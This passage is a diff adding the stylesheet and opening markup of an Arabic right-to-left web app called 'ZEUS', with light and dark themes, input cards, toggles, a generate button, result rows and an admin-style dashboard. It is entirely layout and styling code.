@@ -1,0 +1,4821 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ZEUS — النظام المتكامل</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* ================================================================
+           ZEUS KINGDOM — Full System Styles (5000+ lines)
+           ================================================================ */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-body: #f5f0e8;
+            --bg-panel: rgba(255, 253, 249, 0.92);
+            --bg-card: rgba(248, 244, 237, 0.80);
+            --bg-input: rgba(240, 235, 225, 0.70);
+            --bg-table: rgba(240, 235, 225, 0.50);
+            --ink: #1e1c18;
+            --ink-2: #4a4640;
+            --ink-faint: #8a8478;
+            --gold: #b8942e;
+            --gold-deep: #9f7d25;
+            --gold-light: #d9b84a;
+            --gold-soft: rgba(184, 148, 46, 0.14);
+            --gold-glow: rgba(184, 148, 46, 0.20);
+            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
+            --line: rgba(184, 148, 46, 0.12);
+            --line-strong: rgba(184, 148, 46, 0.20);
+            --success: #1a8a4a;
+            --danger: #d93025;
+            --warning: #b8942e;
+            --radius-card: 24px;
+            --radius-sm: 12px;
+            --transition: all 0.35s cubic-bezier(0.22, 1, 0.36, 1);
+            --font-ar: 'Amiri', serif;
+            --font-en: 'Inter', sans-serif;
+            --shadow-dash: 0 20px 60px rgba(0, 0, 0, 0.30), 0 0 80px rgba(0, 0, 0, 0.10);
+            --shadow-card: 0 8px 30px rgba(0, 0, 0, 0.05);
+            --sidebar-width: 240px;
+        }
+
+        [data-theme="dark"] {
+            --bg-body: #12100e;
+            --bg-panel: rgba(20, 18, 15, 0.95);
+            --bg-card: rgba(40, 37, 32, 0.75);
+            --bg-input: rgba(50, 46, 40, 0.70);
+            --bg-table: rgba(40, 37, 32, 0.50);
+            --ink: #ede8de;
+            --ink-2: #b8b0a4;
+            --ink-faint: #7a7264;
+            --line: rgba(184, 148, 46, 0.08);
+            --line-strong: rgba(184, 148, 46, 0.15);
+            --shadow-card: 0 8px 30px rgba(0, 0, 0, 0.20);
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg-body);
+            color: var(--ink);
+            font-family: var(--font-ar);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.6;
+            position: relative;
+            overflow-x: hidden;
+            transition: background 0.4s, color 0.4s;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.03) 0%, transparent 40%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        ::-webkit-scrollbar {
+            width: 5px;
+            height: 5px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--gold-light);
+            border-radius: 10px;
+            transition: var(--transition);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--gold);
+        }
+
+        .panel {
+            max-width: 920px;
+            width: 100%;
+            background: var(--bg-panel);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.10);
+            padding: 30px 34px 24px;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.06), inset 0 1px 0 rgba(255, 255, 255, 0.4);
+            position: relative;
+            z-index: 1;
+            opacity: 0;
+            animation: fadeUp 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+            transition: background 0.4s, border-color 0.4s, box-shadow 0.4s;
+        }
+
+        [data-theme="dark"] .panel {
+            border-color: rgba(184, 148, 46, 0.06);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.02);
+        }
+
+        .panel::after {
+            content: '';
+            position: absolute;
+            inset: 4px;
+            border-radius: calc(var(--radius-card) - 4px);
+            border: 1px solid rgba(184, 148, 46, 0.04);
+            pointer-events: none;
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(24px) scale(0.97);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @media (max-width: 640px) {
+            .panel {
+                padding: 18px 16px 16px;
+            }
+        }
+
+        .top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 2px solid var(--line);
+            padding-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 10px;
+            position: relative;
+        }
+
+        .top::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            right: 0;
+            width: 80px;
+            height: 2px;
+            background: var(--gold-shimmer);
+            border-radius: 2px;
+            animation: shimmerLine 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmerLine {
+            0%,
+            100% {
+                opacity: 0.4;
+                width: 60px;
+            }
+            50% {
+                opacity: 1;
+                width: 120px;
+            }
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: default;
+            user-select: none;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            flex-shrink: 0;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .logo svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
+            transition: filter 0.4s;
+        }
+
+        .logo:hover svg {
+            filter: drop-shadow(0 2px 20px rgba(184, 148, 46, 0.30));
+        }
+
+        .logo .pulse {
+            animation: pulseMark 2.2s ease-in-out infinite;
+            transform-origin: center;
+        }
+
+        @keyframes pulseMark {
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 0.3;
+            }
+            50% {
+                transform: scale(1.08);
+                opacity: 0.9;
+            }
+        }
+
+        .logo .glow-ring {
+            animation: glowRing 3s ease-in-out infinite;
+            transform-origin: center;
+        }
+
+        @keyframes glowRing {
+            0%,
+            100% {
+                opacity: 0.3;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.8;
+                transform: scale(1.05);
+            }
+        }
+
+        .name {
+            font-family: var(--font-ar);
+            font-size: 30px;
+            letter-spacing: 5px;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            cursor: pointer;
+            user-select: none;
+            transition: transform 0.3s;
+        }
+
+        .name:hover {
+            transform: scale(1.02);
+        }
+
+        .info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+            font-family: var(--font-en);
+            font-size: 12px;
+            color: var(--ink-faint);
+        }
+
+        .info .row {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.30);
+            padding: 4px 12px 4px 8px;
+            border-radius: 30px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            backdrop-filter: blur(4px);
+            transition: var(--transition);
+        }
+
+        [data-theme="dark"] .info .row {
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        .info .row .icon {
+            width: 14px;
+            height: 14px;
+            stroke: var(--gold);
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+        }
+
+        .theme-toggle {
+            background: none;
+            border: 1px solid var(--line);
+            border-radius: 30px;
+            padding: 4px 12px;
+            cursor: pointer;
+            color: var(--ink-2);
+            font-family: var(--font-en);
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: var(--transition);
+            backdrop-filter: blur(4px);
+        }
+
+        .theme-toggle:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+            background: var(--gold-soft);
+        }
+
+        .theme-toggle svg {
+            width: 15px;
+            height: 15px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.8;
+        }
+
+        @media (max-width: 680px) {
+            .top {
+                flex-direction: column;
+                align-items: stretch;
+                gap: 8px;
+            }
+            .brand {
+                justify-content: center;
+            }
+            .info {
+                justify-content: center;
+                gap: 6px;
+            }
+            .name {
+                font-size: 24px;
+                letter-spacing: 3px;
+            }
+            .logo {
+                width: 42px;
+                height: 42px;
+            }
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-top: 18px;
+        }
+
+        @media (max-width: 640px) {
+            .grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+        }
+
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: var(--radius-card);
+            padding: 18px 20px 16px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-card);
+        }
+
+        [data-theme="dark"] .card {
+            background: rgba(40, 37, 32, 0.60);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(184, 148, 46, 0.02) 0%, transparent 60%);
+            pointer-events: none;
+        }
+
+        .card:hover {
+            border-color: rgba(184, 148, 46, 0.18);
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.06), 0 0 30px rgba(184, 148, 46, 0.03);
+            transform: translateY(-2px);
+        }
+
+        .card .label-wrap {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .card .label-wrap svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--gold);
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+        }
+
+        .card .label {
+            font-family: var(--font-en);
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--ink-faint);
+            opacity: 0.8;
+        }
+
+        .card .input-wrap {
+            display: flex;
+            align-items: center;
+            background: var(--bg-input);
+            border-radius: 14px;
+            padding: 0 14px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            transition: var(--transition);
+            backdrop-filter: blur(4px);
+        }
+
+        .card .input-wrap:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
+            background: rgba(255, 255, 255, 0.60);
+        }
+
+        [data-theme="dark"] .card .input-wrap:focus-within {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .card .input-wrap input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            padding: 12px 0;
+            font-family: var(--font-en);
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--ink);
+            direction: ltr;
+            text-align: right;
+            min-width: 0;
+        }
+
+        .card .input-wrap input::placeholder {
+            color: var(--ink-faint);
+            font-weight: 400;
+            opacity: 0.6;
+        }
+
+        .card .input-wrap input[dir="rtl"] {
+            text-align: right;
+            direction: rtl;
+        }
+
+        .toggle-group {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        @media (max-width: 560px) {
+            .toggle-group {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .zeus-toggle {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg-input);
+            padding: 6px 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(184, 148, 46, 0.05);
+            cursor: pointer;
+            transition: var(--transition);
+            min-height: 40px;
+            gap: 6px;
+            backdrop-filter: blur(4px);
+            position: relative;
+            user-select: none;
+        }
+
+        .zeus-toggle:hover {
+            border-color: rgba(184, 148, 46, 0.20);
+            transform: translateY(-2px);
+            background: rgba(255, 255, 255, 0.50);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.03);
+        }
+
+        [data-theme="dark"] .zeus-toggle:hover {
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .zeus-toggle input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .zeus-toggle .toggle-label {
+            font-family: var(--font-ar);
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--ink-2);
+            transition: var(--transition);
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .zeus-toggle .toggle-label svg {
+            width: 14px;
+            height: 14px;
+            stroke: var(--ink-faint);
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+            transition: var(--transition);
+        }
+
+        .zeus-toggle .track {
+            width: 34px;
+            height: 20px;
+            background: #d5d0c6;
+            border-radius: 30px;
+            position: relative;
+            transition: var(--transition);
+            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
+            flex-shrink: 0;
+        }
+
+        [data-theme="dark"] .zeus-toggle .track {
+            background: #4a4640;
+        }
+
+        .zeus-toggle .track .thumb {
+            width: 14px;
+            height: 14px;
+            background: #fff;
+            border-radius: 50%;
+            position: absolute;
+            top: 3px;
+            right: 3px;
+            transition: var(--transition);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        .zeus-toggle input:checked+.toggle-label {
+            color: var(--ink);
+            font-weight: 600;
+        }
+
+        .zeus-toggle input:checked+.toggle-label svg {
+            stroke: var(--gold);
+        }
+
+        .zeus-toggle input:checked~.track {
+            background: var(--gold-shimmer);
+            box-shadow: 0 0 20px var(--gold-soft);
+        }
+
+        .zeus-toggle input:checked~.track .thumb {
+            right: 17px;
+            background: #fff;
+        }
+
+        .generate-wrap {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0 16px;
+            position: relative;
+        }
+
+        .generate-wrap::before {
+            content: '';
+            position: absolute;
+            inset: -12px -20px;
+            background: radial-gradient(ellipse at center, rgba(184, 148, 46, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+            border-radius: 60px;
+        }
+
+        .btn-generate {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 13px 38px;
+            background: var(--gold-shimmer);
+            background-size: 200% 200%;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: var(--font-en);
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30), inset 0 1px 0 rgba(255, 255, 255, 0.20);
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .btn-generate::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s;
+        }
+
+        .btn-generate:hover::before {
+            transform: translateX(100%);
+        }
+
+        .btn-generate:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40), inset 0 1px 0 rgba(255, 255, 255, 0.20);
+        }
+
+        .btn-generate:active {
+            transform: translateY(0) scale(0.97);
+        }
+
+        .btn-generate svg {
+            width: 18px;
+            height: 18px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .btn-generate.busy {
+            opacity: 0.7;
+            pointer-events: none;
+            animation: pulseBusy 1s ease-in-out infinite;
+        }
+
+        @keyframes pulseBusy {
+            0%,
+            100% {
+                opacity: 0.7;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .btn-generate.done {
+            background: linear-gradient(135deg, #1a8a4a, #126a38);
+            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
+            color: #fff;
+        }
+
+        .btn-generate.done svg {
+            stroke: #fff;
+        }
+
+        @media (max-width: 480px) {
+            .btn-generate {
+                padding: 10px 24px;
+                font-size: 12px;
+                gap: 6px;
+            }
+            .btn-generate svg {
+                width: 16px;
+                height: 16px;
+            }
+        }
+
+        .result-section {
+            margin-bottom: 18px;
+        }
+
+        .result-section .label-wrap {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .result-section .label-wrap svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--gold);
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+        }
+
+        .result-section .section-title {
+            font-family: var(--font-en);
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--ink-faint);
+            opacity: 0.8;
+        }
+
+        .result {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg-card);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: var(--radius-card);
+            padding: 14px 20px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            flex-wrap: wrap;
+            gap: 10px;
+            transition: var(--transition);
+            box-shadow: var(--shadow-card);
+        }
+
+        .result:hover {
+            border-color: rgba(184, 148, 46, 0.15);
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.06);
+        }
+
+        .result .info-box {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            min-width: 120px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .result .info-box .value {
+            font-family: var(--font-en);
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: inline-block;
+            width: fit-content;
+        }
+
+        .result .info-box .sub {
+            font-family: var(--font-en);
+            font-size: 11px;
+            color: var(--ink-faint);
+            margin-top: 2px;
+            word-break: break-all;
+            -webkit-text-fill-color: var(--ink-faint);
+        }
+
+        .result .actions {
+            display: flex;
+            gap: 8px;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .result .actions button {
+            width: 38px;
+            height: 38px;
+            border-radius: 12px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            background: rgba(255, 255, 255, 0.40);
+            backdrop-filter: blur(4px);
+            color: var(--ink-2);
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .result .actions button svg {
+            width: 17px;
+            height: 17px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.8;
+            transition: var(--transition);
+        }
+
+        .result .actions button:hover {
+            transform: translateY(-3px);
+            border-color: var(--gold);
+            color: var(--gold);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.05);
+            background: rgba(255, 255, 255, 0.70);
+        }
+
+        [data-theme="dark"] .result .actions button {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        [data-theme="dark"] .result .actions button:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .result .actions button.ok {
+            border-color: var(--success);
+            background: var(--success);
+            color: #fff;
+        }
+
+        .result .actions button.ok svg {
+            stroke: #fff;
+        }
+
+        @media (max-width: 480px) {
+            .result {
+                flex-direction: column;
+                align-items: stretch;
+                padding: 12px 16px;
+            }
+            .result .info-box .value {
+                font-size: 16px;
+            }
+            .result .actions {
+                justify-content: flex-end;
+            }
+            .result .actions button {
+                width: 34px;
+                height: 34px;
+            }
+            .result .actions button svg {
+                width: 15px;
+                height: 15px;
+            }
+        }
+
+        .footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding-top: 16px;
+            border-top: 2px solid var(--line);
+            font-family: var(--font-ar);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: var(--transition);
+            flex-wrap: wrap;
+            position: relative;
+        }
+
+        .footer::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: 50%;
+            transform: translateX(50%);
+            width: 40px;
+            height: 2px;
+            background: var(--gold-shimmer);
+            border-radius: 2px;
+            animation: shimmerLineCenter 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmerLineCenter {
+            0%,
+            100% {
+                opacity: 0.4;
+                width: 40px;
+            }
+            50% {
+                opacity: 1;
+                width: 80px;
+            }
+        }
+
+        .footer:hover {
+            transform: translateY(-2px);
+        }
+
+        .footer .dev-name {
+            font-family: var(--font-ar);
+            font-weight: 700;
+            letter-spacing: 3px;
+            font-size: 18px;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            transition: var(--transition);
+        }
+
+        .footer:hover .dev-name {
+            transform: scale(1.02);
+        }
+
+        .footer .icon-badge {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .footer .icon-badge svg {
+            width: 100%;
+            height: 100%;
+            stroke: var(--gold);
+            fill: none;
+            stroke-width: 1.8;
+            transition: var(--transition);
+        }
+
+        .footer:hover .icon-badge svg {
+            transform: rotate(12deg) scale(1.1);
+            stroke: var(--gold-deep);
+        }
+
+        @media (max-width: 480px) {
+            .footer {
+                font-size: 14px;
+                gap: 6px;
+                padding-top: 14px;
+            }
+            .footer .dev-name {
+                font-size: 16px;
+                letter-spacing: 2px;
+            }
+            .footer .icon-badge {
+                width: 18px;
+                height: 18px;
+            }
+        }
+
+        .dash-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: rgba(10, 8, 6, 0.82);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            display: none;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 16px;
+            overflow-y: auto;
+            animation: dashFadeIn 0.4s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .dash-overlay.active {
+            display: flex;
+        }
+
+        @keyframes dashFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.96) translateY(24px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .dash-container {
+            width: 100%;
+            max-width: 1440px;
+            background: var(--bg-panel);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.08);
+            box-shadow: var(--shadow-dash);
+            position: relative;
+            max-height: 98vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: background 0.4s, border-color 0.4s;
+        }
+
+        [data-theme="dark"] .dash-container {
+            background: rgba(20, 18, 15, 0.97);
+            border-color: rgba(184, 148, 46, 0.05);
+        }
+
+        .dash-container::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        .dash-container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .dash-container::-webkit-scrollbar-thumb {
+            background: var(--gold-light);
+            border-radius: 10px;
+        }
+
+        .dash-body {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+            min-height: 420px;
+        }
+
+        .dash-sidebar {
+            width: var(--sidebar-width);
+            background: rgba(184, 148, 46, 0.04);
+            border-left: 1px solid var(--line);
+            padding: 14px 10px;
+            overflow-y: auto;
+            flex-shrink: 0;
+            transition: width 0.3s, background 0.3s, padding 0.3s;
+        }
+
+        [data-theme="dark"] .dash-sidebar {
+            background: rgba(184, 148, 46, 0.02);
+        }
+
+        .dash-sidebar .sidebar-label {
+            font-family: var(--font-en);
+            font-size: 9px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--ink-faint);
+            padding: 6px 12px 2px;
+            display: block;
+            opacity: 0.6;
+        }
+
+        .dash-sidebar .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 9px 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: var(--transition);
+            color: var(--ink-2);
+            font-family: var(--font-en);
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 2px;
+            border: none;
+            background: none;
+            width: 100%;
+            text-align: right;
+            position: relative;
+        }
+
+        .dash-sidebar .nav-item svg {
+            width: 17px;
+            height: 17px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+            transition: var(--transition);
+        }
+
+        .dash-sidebar .nav-item:hover {
+            background: var(--gold-soft);
+            color: var(--gold);
+        }
+
+        .dash-sidebar .nav-item.active {
+            background: var(--gold-soft);
+            color: var(--gold);
+            font-weight: 600;
+        }
+
+        .dash-sidebar .nav-item .badge-nav {
+            margin-right: auto;
+            background: var(--gold-soft);
+            color: var(--gold);
+            font-size: 9px;
+            font-weight: 700;
+            padding: 0 8px;
+            border-radius: 20px;
+            transition: var(--transition);
+        }
+
+        .dash-sidebar .nav-item.active .badge-nav {
+            background: var(--gold);
+            color: #fff;
+        }
+
+        .dash-content {
+            flex: 1;
+            padding: 18px 24px 20px;
+            overflow-y: auto;
+            min-width: 0;
+        }
+
+        .dash-content .view {
+            display: none;
+            animation: fadeUp 0.35s ease;
+        }
+
+        .dash-content .view.active {
+            display: block;
+        }
+
+        .dash-header-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 22px;
+            border-bottom: 1px solid var(--line);
+            flex-wrap: wrap;
+            gap: 10px;
+            flex-shrink: 0;
+        }
+
+        .dash-header-bar .dash-title {
+            font-family: var(--font-ar);
+            font-size: 24px;
+            font-weight: 700;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .dash-header-bar .dash-title small {
+            font-size: 11px;
+            font-weight: 400;
+            color: var(--ink-faint);
+            -webkit-text-fill-color: var(--ink-faint);
+            font-family: var(--font-en);
+            letter-spacing: 0.5px;
+            opacity: 0.7;
+        }
+
+        .dash-header-actions {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .dash-header-actions button {
+            background: none;
+            border: 1px solid var(--line);
+            border-radius: 30px;
+            padding: 5px 14px;
+            cursor: pointer;
+            color: var(--ink-2);
+            font-family: var(--font-en);
+            font-size: 11px;
+            font-weight: 500;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(4px);
+        }
+
+        .dash-header-actions button svg {
+            width: 13px;
+            height: 13px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 1.8;
+        }
+
+        .dash-header-actions button:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+            background: var(--gold-soft);
+        }
+
+        .dash-stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .dash-stat-card {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 14px 16px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            transition: var(--transition);
+            box-shadow: var(--shadow-card);
+        }
+
+        .dash-stat-card:hover {
+            border-color: rgba(184, 148, 46, 0.14);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+        }
+
+        .dash-stat-card .stat-num {
+            font-size: 26px;
+            font-weight: 800;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: inline-block;
+            font-family: var(--font-en);
+        }
+
+        .dash-stat-card .stat-label {
+            font-size: 11px;
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+            margin-top: 2px;
+            opacity: 0.8;
+        }
+
+        .dash-table-wrap {
+            background: var(--bg-table);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            overflow: hidden;
+            margin-bottom: 14px;
+            backdrop-filter: blur(4px);
+            transition: var(--transition);
+        }
+
+        .dash-table-wrap:hover {
+            border-color: rgba(184, 148, 46, 0.12);
+        }
+
+        .dash-table-wrap .table-scroll {
+            overflow-x: auto;
+            padding: 2px;
+        }
+
+        .dash-table-wrap table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 12px;
+            min-width: 480px;
+        }
+
+        .dash-table-wrap table th {
+            background: rgba(184, 148, 46, 0.05);
+            color: var(--gold-deep);
+            font-weight: 600;
+            padding: 8px 12px;
+            text-align: right;
+            font-family: var(--font-en);
+            letter-spacing: 0.5px;
+            font-size: 10px;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--line);
+            position: sticky;
+            top: 0;
+            z-index: 2;
+        }
+
+        [data-theme="dark"] .dash-table-wrap table th {
+            background: rgba(184, 148, 46, 0.08);
+        }
+
+        .dash-table-wrap table td {
+            padding: 8px 12px;
+            border-bottom: 1px solid rgba(184, 148, 46, 0.04);
+            color: var(--ink-2);
+            vertical-align: middle;
+            font-size: 12px;
+            transition: var(--transition);
+        }
+
+        .dash-table-wrap table tr:hover td {
+            background: rgba(184, 148, 46, 0.03);
+        }
+
+        .dash-table-wrap table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .dash-table-wrap .empty-msg {
+            padding: 24px;
+            text-align: center;
+            color: var(--ink-faint);
+            font-size: 13px;
+            font-family: var(--font-en);
+        }
+
+        .actions-cell {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .actions-cell button {
+            background: none;
+            border: none;
+            color: var(--gold);
+            font-family: var(--font-en);
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 2px 10px;
